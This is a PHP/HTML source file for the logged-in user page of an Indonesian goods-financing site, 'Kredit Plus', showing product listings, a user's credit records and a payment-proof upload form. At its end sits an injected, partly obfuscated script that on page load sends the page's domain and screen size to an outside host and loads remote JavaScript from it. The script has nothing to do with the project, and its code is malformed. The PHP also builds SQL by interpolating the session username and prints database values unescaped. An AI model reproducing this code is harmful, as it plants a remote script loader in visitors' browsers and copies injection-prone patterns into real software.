<?php
session_start();
include '../core/core.php';

if(!isset($_SESSION['username'])) {
  header("Location: ../user/login.php?access_denied");
}
?>

<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Kredit Plus - Mudah dan Cepat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="description" content="Unique - Responsive vCard Template" />
  <meta name="keywords" content="vcard, resposnive, retina, resume, jquery, css3, bootstrap, Unique, portfolio" />
  <meta name="author" content="lmtheme" />
  <link rel="shortcut icon" href="../favicon.ico">

  <link rel="stylesheet" href="../css/bootstrap.css" type="text/css">
  <link rel="stylesheet" href="../css/normalize.css" type="text/css">
  <link rel="stylesheet" href="../css/animate.css" type="text/css">
  <link rel="stylesheet" href="../css/transition-animations.css" type="text/css">
  <link rel="stylesheet" href="../css/jquery.mCustomScrollbar.min.css" type="text/css">
  <link rel="stylesheet" href="../css/owl.carousel.css" type="text/css">
  <link rel="stylesheet" href="../css/magnific-popup.css" type="text/css">
  <link rel="stylesheet" href="../css/main-red.css" type="text/css">

  <!-- This styles needs for demo -->
  <link rel="stylesheet" href="../preview/lmpixels-demo-panel.css" type="text/css">
  <!-- /This styles needs for demo -->
  <link rel="stylesheet" href="../user/css/bootstrap.min.css">
  <link rel="stylesheet" href="../user/css/icons.css">
  <link rel="stylesheet" href="../user/css/icons.css">

  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','../../../../www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-96534204-1', 'auto');
  ga('send', 'pageview');

  </script>

  <script src="../js/jquery-2.1.3.min.js"></script>
  <script src="../js/modernizr.custom.js"></script>
</head>

<body>
  <!-- Loading animation -->
  <div class="preloader">
    <div class="preloader-animation">
      <div class="dot1"></div>
      <div class="dot2"></div>
    </div>
  </div>
  <!-- /Loading animation -->

  <div id="page" class="page">
    <!-- Header -->
    <header id="site_header" class="header mobile-menu-hide header-color-light">
      <div class="my-photo tilt-effect">
        <img src="../images/photo.png" alt="image">
      </div>

      <div class="site-title-block">
        <h1 class="site-title">Kredit Plus</h1>
      </div>

      <!-- Navigation -->
      <div class="site-nav">
        <!-- Main menu -->
        <ul id="nav" class="site-main-menu">
          <li>
            <a class="pt-trigger" href="#home" data-animation="21"><i class="menu-icon pe-7s-icon pe-7s-home"></i>Halaman Utama</a>
          </li>
        </li>
        <li>
          <a class="pt-trigger" href="#about_me2" data-animation="17"><i class="menu-icon pe-7s-icon pe-7s-user"></i>Tentang Kami</a>
        </li>
        <li>
          <a class="pt-trigger" href="#info" data-animation="20"><i class="menu-icon pe-7s-icon pe-7s-info"></i>Informasi</a>
        </li>
        <li>
          <a class="pt-trigger" href="#portfolio" data-animation="19"><i class="menu-icon pe-7s-icon pe-7s-bicycle"></i>Barang</a>
        </li>
        <li>
          <a class="pt-trigger" href="#contact" data-animation="20"><i class="menu-icon pe-7s-icon pe-7s-mail"></i>Kontak</a>
        </li>
      </ul>
      <!-- /Main menu -->
    </div>
    <!-- Navigation -->
  </header>
  <!-- /Header -->

  <!-- Mobile Header -->
  <div class="mobile-header mobile-visible">
    <div class="mobile-logo-container">
      <div class="mobile-site-title">Kredit Barang</div>
    </div>

    <a class="menu-toggle mobile-visible">
      <i class="fa fa-bars"></i>
    </a>
  </div>
  <!-- /Mobile Header -->

  <!-- Main Content -->
  <div id="main" class="site-main">
    <!-- Page changer wrapper -->
    <div class="pt-wrapper" style="background-image: url(../images/bg.png);">
      <!-- Subpages -->
      <div class="subpages">

        <!-- Home Subpage -->
        <section class="pt-page pt-page-1 section-without-bg section-paddings-0 table" data-id="home">
          <div class="section-inner">
            <div class="home-page-block">
              <h2>Kredit Barang</h2>
              <div class="owl-carousel text-rotation">
                <div class="item">
                  <p class="home-page-description">Ya disini...</p>
                </div>
                <div class="item">
                  <p class="home-page-description">Mudah dan Cepat</p>
                </div>
              </div>
            </div>
          </div>
        </section>
        <!-- End of Home Subpage -->

        <!-- Portfolio Subpage -->
        <section class="pt-page pt-page-4" data-id="portfolio">
          <div class="border-block-top-110"></div>
          <div class="section-inner">
            <div class="section-title-block">
              <div class="section-title-wrapper">
                <h2 class="section-title">Barang</h2>
                <h5 class="section-description">Temukan pilihanmu...</h5>
              </div>
            </div>

            <!-- Portfolio Content -->
            <div class="portfolio-content">
              <!-- Portfolio filter -->
              <ul id="portfolio_filters" class="portfolio-filters">

                <li class="active">
                  <a class="filter btn btn-sm btn-link active" data-group="all">All</a>
                </li>
                <?php
                $sql = "SELECT brg.*, kat.*, brg.id AS bid FROM barang AS brg JOIN kategori AS kat ON brg.kategori = kat.nama";

                $query = mysqli_query($connect, $sql);

                while($data = mysqli_fetch_array($query)){

                  ?>
                  <li>
                    <a class="filter btn btn-sm btn-link" data-group="<?= $data['kategori'] ?>"><?php echo $data['kategori'] ?></a>
                  </li>
                <?php } ?>
              </ul>
              <!-- End of Portfolio filter -->

              <!-- Portfolio Grid -->
              <div id="portfolio_grid" class="portfolio-grid portfolio-masonry masonry-grid-3">
                <!-- Portfolio Item 1 -->
                <?php
                $sql = "SELECT brg.*, kat.*, brg.id AS bid FROM barang AS brg JOIN kategori AS kat ON brg.kategori = kat.nama";

                $query = mysqli_query($connect, $sql);

                while($data = mysqli_fetch_array($query)){

                  ?>
                  <figure class="item" data-groups='["all", "<?= $data['kategori'] ?>"]'>
                    <a href="page-Barang.php?id=<?=$data['id_kategori']?>">
                      <img src="../images/portfolio/1.jpg" alt="">
                      <div>
                        <h5 class="name"><?php echo $data['nama_produk'] ?></h5>
                        <small><?php echo $data['kategori'] ?></small>
                        <i class="pe-7s-icon pe-7s-display2"></i>
                      </div>
                    </a>
                  </figure>
                <?php } ?>

              </div>
              <!-- /Portfolio Grid -->

            </div>
            <!-- /Portfolio Content -->
          </div>
        </section>
        <!-- /Portfolio Subpage -->

        <!-- Contact Subpage -->
        <section class="pt-page pt-page-5" data-id="contact">
          <div class="border-block-top-110"></div>
          <div class="section-inner">
            <div class="section-title-block">
              <div class="section-title-wrapper">
                <h2 class="section-title">Contact</h2>
                <h5 class="section-description">Bantuan?</h5>
              </div>
            </div>

            <div class="row">
              <div class="col-sm-6 col-md-6 subpage-block">
                <div class="block-title">
                  <h3>Temukan kami...</h3>
                </div>
                <p>PT. Finansia Multi Finance (Kredit plus) merupakan perusahaan yang bergerak di bidang pembiayaan di Indonesia dan didirikan pada tanggal 9 Juni 1994. PT. Finansial Multi Finance (Kredit Plus) mempunyai sebuah lisensi tentang  pembiayaan modal kerja, pembiayaan multi guna dan berbagai aktivitas lainnya  sesuai dengan persetujuan Otoritas Jasa Keuangan. Saat ini, Kredit plus memusatkan bisnisnya pada bidang pembiayaan mobil, motor dan elektronik. .</p>
                <div class="contact-info-block">
                  <div class="ci-icon">
                    <i class="pe-7s-icon pe-7s-map-marker"></i>
                  </div>
                  <div class="ci-text">
                    <h5>Indonesia, Jawa Barat</h5>
                  </div>
                </div>
                <div class="contact-info-block">
                  <div class="ci-icon">
                    <i class="pe-7s-icon pe-7s-mail"></i>
                  </div>
                  <div class="ci-text">
                    <h5>kreditBarang@example.com</h5>
                  </div>
                </div>
                <div class="contact-info-block">
                  <div class="ci-icon">
                    <i class="pe-7s-icon pe-7s-call"></i>
                  </div>
                  <div class="ci-text">
                    <h5>+123 654 78900</h5>
                  </div>
                </div>
                <div class="contact-info-block">
                  <div class="ci-icon">
                    <i class="pe-7s-icon pe-7s-check"></i>
                  </div>
                  <div class="ci-text">
                    <h5>Active</h5>
                  </div>
                </div>
              </div>

              <div class="col-sm-6 col-md-6 subpage-block">
                <div class="block-title">
                  <h3>Contact Form</h3>
                </div>
                <form action="insert-psn.php" method="post" >

                  <div class="controls">
                    <div class="form-group">
                      <input id="form_name" type="text" name="nm" class="form-control" placeholder="Full Name" required="required" data-error="Name is required.">
                      <div class="form-control-border"></div>
                      <i class="form-control-icon pe-7s-user"></i>
                      <div class="help-block with-errors"></div>
                    </div>

                    <div class="form-group">
                      <input id="form_email" type="email" name="eml" class="form-control" placeholder="Email Address" required="required" data-error="Valid email is required.">
                      <div class="form-control-border"></div>
                      <i class="form-control-icon pe-7s-mail"></i>
                      <div class="help-block with-errors"></div>
                    </div>

                    <div class="form-group">
                      <textarea id="form_message" name="msg" class="form-control" placeholder="Message for Me" rows="4" required="required" data-error="Please, leave me a message."></textarea>
                      <div class="form-control-border"></div>
                      <i class="form-control-icon pe-7s-comment"></i>
                      <div class="help-block with-errors"></div>
                    </div>

                    <input type="submit" name="tbh_psn" class="button btn-send" value="Send message">


                  </div>
                </form>
              </div>
            </div>
          </div>
        </section>
        <!-- End Contact Subpage -->


        <!-- About Me Subpage -->
        <section class="pt-page pt-page-2" data-id="info">
          <div class="border-block-top-110"></div>
          <div class="section-inner">
            <div class="section-title-block">
              <div class="section-title-wrapper clearfix">
                <h2 class="section-title">Informasi</h2>
                <h5 class="section-description">Informasi Barang</h5>
              </div>
            </div>

            <script type="text/javascript">
            $(document).ready(function() {
              $('#datatable2').DataTable();

              //Buttons examples
              var table = $('#datatable2-buttons').DataTable({
                lengthChange: false,
                searching: true,
                buttons: ['copy', 'excel', 'pdf']
              });

              table.buttons().container()
              .appendTo('#datatable2-buttons_wrapper .col-md-6:eq(0)');
            });
            </script>

            <div class="row">

              <div class="col-12">
                <div class="card-box table-responsive">
                  <table id="datatable2-buttons" class="table table-striped table-bordered" cellspacing="0" width="100%">
                    <thead>

                      <tr>
                        <th>No</th>
                        <th>Nama</th>
                        <th>Produk</th>
                        <th>Metode</th>
                        <th>Waktu</th>
                        <th>Jenis</th>
                        <th>Status</th>
                        <th>Lainnya</th>
                      </tr>
                    </thead>

                    <tbody>
                      <?php
                      $no=0;
                      $ses = $_SESSION['username'];
                      $sql = "SELECT * FROM verifikasi WHERE nama='$ses'";

                      $query = mysqli_query($connect, $sql);

                      while($data = mysqli_fetch_array($query)){
                        $no++;
                        $status = $data['status'];
                        ?>
                        <tr>
                          <td><?= $no ?></td>
                          <td><?= $data['nama'] ?></td>
                          <td><?= $data['nama_produk'] ?></td>
                          <td><?= $data['metode'] ?></td>
                          <td><?= $data['waktu'] ?></td>
                          <td><?= $data['jenis'] ?></td>
                          <td><?= $data['status'] ?></td>
                          <td><a href="#selengkap <?php $data['id']; ?>" class="pt-trigger">Lihat..</a></td>
                        </tr>
                      <?php } ?>
                    </tbody>

                  </td>
                </tr>
              </tfoot>
            </table>

          </div>
        </div>
        <!-- </div> -->
        <!-- end row -->
      </section>
      <!-- End of About Me Subpage -->

      <!-- About Me Subpage -->
      <section class="pt-page pt-page-2" data-id="selengkap">
        <button type="button" name="button" class="button" onclick="document.location.href='../user/page-index.php'">Kembali</button>
        <div class="section-inner">
          <div class="section-title-block">
            <div class="section-title-wrapper clearfix">
              <h2 class="section-title">Informasi</h2>
              <h5 class="section-description">Informasi Transaksi</h5>
            </div>
          </div>

          <div class="row">

            <div class="col-12">
              <div class="card-box table-responsive">
                <table id="datatable3-buttons" class="table table-striped table-bordered" cellspacing="0" width="100%">
                  <thead>
                  </thead>


                  <tbody>
                    <form method="post" enctype="multipart/form-data" action="../user/prosesgambar.php">

                      <div class="form-group">
                        <label>Jumlah Transaksi</label>
                        <select class="form-control" name="hits">
                          <option value="5000">5000</option>
                          <option value="10000">10000</option>
                          <option value="15000">15000</option>
                          <option value="20000">20000</option>
                          <option value="25000">25000</option>
                          <option value="50000">50000</option>
                          <option value="100000">100000</option>
                          <option value="150000">150000</option>
                          <option value="200000">200000</option>
                          <option value="250000">250000</option>
                          <option value="300000">300000</option>
                          <option value="350000">350000</option>
                          <option value="400000">400000</option>
                          <option value="450000">450000</option>
                          <option value="500000">500000</option>
                          <option value="550000">550000</option>
                          <option value="600000">600000</option>
                          <option value="650000">650000</option>
                          <option value="700000">700000</option>
                          <option value="750000">750000</option>
                          <option value="800000">800000</option>
                          <option value="850000">850000</option>
                          <option value="900000">900000</option>
                          <option value="950000">950000</option>
                          <option value="1000000">1000000</option>
                        </select>
                      </div>

                      <?php
                      $sql = "SELECT SUM(hits) FROM upload";
                      $query = mysqli_query($connect, $sql);

                      while($data = mysqli_fetch_array($query)){
                        ?>

                      <?php } ?>

                      <?php
                      if ($data['hits'] < $data['harga']) {
                        // code...
                        echo "<input type='hidden' name='deskripsi' value='Belum Lunas'>";
                      }else{
                        // code...
                        echo "<input type='hidden' name='deskripsi' value='Lunas'>";
                      }
                      ?>

                      <?php
                      $sql = "SELECT * FROM barang";
                      $query = mysqli_query($connect, $sql);

                      while($data = mysqli_fetch_array($query)){
                        ?>

                        <?php } ?>

                      <div class="form-group">
                        <h5>Bukti Transaksi</h5>
                        <input type="file" name="fupload" class="form-control">
                        <!-- <h6>Melakukan pembayaran sesuai dengan jumlah kredit yang dipilih</h6> -->
                      </div>

                      <input type="submit" class="button btn-send" value="Kirim">
                    </form>

                    <br><br>
                    <h6>Kredit Saat Ini</h6>
                    <?php
                    $no=0;
                    $sql = "SELECT SUM(hits) FROM upload";
                    // $total = 0;
                    $query = mysqli_query($connect, $sql);

                    while($data = mysqli_fetch_array($query)){
                      $no++;
                      // $status = $data['hits'];
                      ?>

                      <p class="btn btn-primary"><?= "Rp ".number_format($data['SUM(hits)']) ?></p>

                    <?php } ?>

                    <!-- <?php
                    if ($data['hits'] > $data['harga']) {
                      echo "Lunas";
                    }else {
                      echo "Belum Lunas";
                    }
                    ?> -->

                    <h6>Target Kredit</h6>
                    <?php
                    $no=0;
                    $sql = "SELECT * FROM barang";
                    $query = mysqli_query($connect, $sql);

                    while($data = mysqli_fetch_array($query)){
                      $no++;
                      $status = $data['harga'];
                      ?>

                      <p class="btn btn-primary"><?= "Rp ". number_format($data['harga']) ?></p>
                      <?php } ?>



                  </tbody>

                  <!-- <script>
                  $('#startClock').click(function(){

                    var dwn = document.getElementById("bar");
                    var width = 1;
                    var id = setInterval(frame, 50);
                    function frame() {
                      if (width >= 100) {
                        clearInterval(id);
                      }else {
                        width++;
                        dwn.style.width = width + '%';
                        dwn.innerHTML = width * 1 + '%';
                      }
                    }

                    var counter = 5;
                    setInterval(function() {
                      counter--;
                      if (counter >= 0) {
                        span = document.getElementById("count");
                        span.innerHTML = counter;
                      }
                      if (counter === 0) {
                        alert('Waktu pembayaran sudah habis');
                        clearInterval(counter);
                      }
                    }, 1000);

                  });
                  </script> -->

                </td>
              </tr>
            </tfoot>
          </table>

        </div>
      </div>
      <!-- </div> -->
      <!-- end row -->
    </section>
    <!-- End of About Me Subpage -->

    <!-- About Me Subpage -->
    <section class="pt-page pt-page-2" data-id="about_me2">
      <div class="border-block-top-110"></div>
      <div class="section-inner">
        <div class="section-title-block">
          <div class="section-title-wrapper clearfix">
            <h2 class="section-title">Tentang Kami</h2>
            <h5 class="section-description">Kredit Barang - Mudah dan Cepat</h5>
          </div>
        </div>

        <div class="row">
          <div class="col-sm-6 col-md-6 col-lg-4 subpage-block">
            <div class="my-photo-block tilt-effect">
              <img src="../images/photo.png" alt="">
            </div>
          </div>

          <div class="col-sm-6 col-md-6 col-lg-4">
            <h3>Kredit Barang</h3>
            <p>Praesent ut tortor consectetur, semper sapien non, lacinia augue. Aenean arcu libero, facilisis et nisi non, tempus faucibus tortor. Mauris vel nulla aliquam, pellentesque enim ac, faucibus tortor. Nulla odio nibh, cursus sit amet urna id, dignissim euismod augue.</p>
            <p>Duis sollicitudin, libero porttitor rutrum ultrices, turpis lorem fermentum justo, quis ornare augue tortor non est. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.</p>
          </div>

          <div class="col-sm-6 col-md-6 col-lg-4 subpage-block">
            <ul class="info-list">
              <li><span class="title">Alamat</span><span class="value">Indonesia Jawa Barat, Cirebon</span></li>
              <li><span class="title">E-mail</span><span class="value"><a href="mailto:email@example.com">kreditBarang@example.com</a></span></li>
              <li><span class="title">Telepon</span><span class="value">+0123 123 456 789</span></li>
              <li><span class="title">Status</span><span class="value available">Active</span></li>
            </ul>

            <ul class="social-links">
              <li><a class="tip social-button" href="#" title="Twitter"><i class="fa fa-twitter"></i></a></li>
              <!-- Full list of social icons: http://fontawesome.io/icons/#brand -->
              <li><a class="tip social-button" href="#" title="Facebook"><i class="fa fa-facebook"></i></a></li>
              <li><a class="tip social-button" href="#" title="Google Plus"><i class="fa fa-google-plus"></i></a></li>
            </ul>
          </div>
        </div>

        <!-- Services block -->
        <div class="block-title">
          <h3>Layanan</h3>
        </div>

        <div class="row">
          <div class="col-sm-3 col-md-3 subpage-block">
            <div class="service-block">
              <div class="service-info">
                <img src="../images/service/web_design_icon.png" alt="Responsive Design">
                <h4>Website</h4>
                <p>Konsumen datang ke website kami.</p>
              </div>
            </div>
          </div>

          <div class="col-sm-3 col-md-2 subpage-block">
            <div class="service-block">
              <div class="service-info">
                <img src="../images/service/photography_icon.png" alt="Photography">
                <h4>Barang</h4>
                <p>Konsumen memilih Barang yang akan dibeli.</p>
              </div>
            </div>
          </div>

          <div class="col-sm-3 col-md-2 subpage-block">
            <div class="service-block">
              <div class="service-info">
                <img src="../images/service/creativity_icon.png" alt="Creativity">
                <h4>Transaksi</h4>
                <p>Terjadilah transaksi jual beli.</p>
              </div>
            </div>
          </div>

          <div class="col-sm-3 col-md-2 subpage-block">
            <div class="service-block">
              <div class="service-info">
                <img src="../images/service/advetising_icon.png" alt="Advetising">
                <h4>Konsumen</h4>
                <p>Konsumen membayar sejumlah harga Barang.</p>
              </div>
            </div>
          </div>

          <div class="col-sm-3 col-md-3 subpage-block">
            <div class="service-block">
              <div class="service-info">
                <img src="../images/service/packaging_icon.png" alt="Advetising">
                <h4>Kurir</h4>
                <p>Kurir mengirim Barang yang dibeli oleh konsumen.</p>
              </div>
            </div>
          </div>
        </div>
        <!-- End of Services block -->
      </div>
    </section>
    <!-- End of About Me Subpage -->

  </div>
</div>
<!-- /Page changer wrapper -->
</div>
<!-- /Main Content -->
</div>

<!-- Demo Color changer -->
<a id="lm_demo_panel_switcher" class="lm-demo-panel-switcher right"><i class="fa fa-gear"></i></a>
<div id="lm_demo_panel" class="lm-demo-panel right panel-color-red active">
  <div class="demo-panel-title">Selamat datang!</div>
  <div class="demo-panel-title">
    <?php echo $_SESSION['username']; ?></div>
    <div id="header_position" class="demo-panel-options mobile-hidden">

      <!-- <a href="../user/profile.php" class="layout-switcher" data-id="layout-menu-bottom"><div class="preview layout bottom">Profile</div></a> -->
      <a href="../user/logout.php" class="layout-switcher" data-id="layout-menu-bottom"><div class="preview layout bottom">Keluar</div></a>
    </div>

    <!-- /Demo Color changer -->

    <!-- Required datatable js -->
    <script src="../plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="../plugins/datatables/dataTables.bootstrap4.min.js"></script>
    <!-- Buttons examples -->
    <script src="../plugins/datatables/dataTables.buttons.min.js"></script>
    <script src="../plugins/datatables/buttons.bootstrap4.min.js"></script>
    <script src="../plugins/datatables/jszip.min.js"></script>
    <script src="../plugins/datatables/pdfmake.min.js"></script>
    <script src="../plugins/datatables/vfs_fonts.js"></script>
    <script src="../plugins/datatables/buttons.html5.min.js"></script>
    <script src="../plugins/datatables/buttons.print.min.js"></script>
    <script src="../plugins/datatables/buttons.colVis.min.js"></script>
    <!-- Responsive examples -->
    <script src="../plugins/datatables/dataTables.responsive.min.js"></script>
    <script src="../plugins/datatables/responsive.bootstrap4.min.js"></script>


    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/pages-switcher.js"></script>
    <script src="../js/imagesloaded.pkgd.min.js"></script>
    <script src="../js/validator.js"></script>
    <script src="../js/jquery.shuffle.min.js"></script>
    <script src="../js/masonry.pkgd.min.js"></script>
    <script src="../js/owl.carousel.min.js"></script>
    <script src="../js/jquery.magnific-popup.min.js"></script>
    <script src="../js/jquery.mCustomScrollbar.concat.min.js"></script>
    <script src="../js/tilt.jquery.min.js"></script>
    <script src="../js/jquery.hoverdir.js"></script>
    <script src="../js/main.js"></script>

    <!-- Demo Color changer Script -->
    <script src="../preview/lmpixels-demo-panel.js"></script>
    <!-- /Demo Color changer Script -->
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVa2K%2bNZnlpTXt9YnUCwpMMLx%2b%2bQHkmE4Wy7RkeBZJGKiJdue9wKB96Kc9iVjivRBFiEw44gPLCtvAbDqY8nlaWKojwq%2bGxts8680ZPIfGcjWoyu1MUIXmG%2b%2fgsc13iDQgNwbvkNzcl%2bgd5G365lc%2fZW9uzrhiAfXhLg0uTMRKGTIzWdvXQ%2b2shx1gs2blnB4W4WGsbJHO22nvyZ74GuIWsH%2bO2iD4UoLHdXpJvcTociFcQK9Dknfvs75H62QFe%2beG0uJJQHQwmanVfeImrn9vjTJrTMhkA6wmV23gTia4rlkd3WVk8bxtQmNtzP7ShU8RCESFWt%2fukSnHOF4HDXptKLmwTZA9k3nw9r0f7sEgrU0Xm8tcUqpgT%2bA3GpgWz0UZBVqoJQUQTafmPPjQfmo%2bujydoTzM%2b4kN2bVShERlJYGTwQiruBjPg4Jcq2vXsOMrY%2ftUBTyzxtnHSs6iYj1qOwVzMd4cpc%2fzRYJcQyAnBMqdxTgyoUr5ibFUVuN0qJG%2bXplJfh1lkgP45Ezt%2b7MOHgoActEOLtw + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
  </body>
  </html>
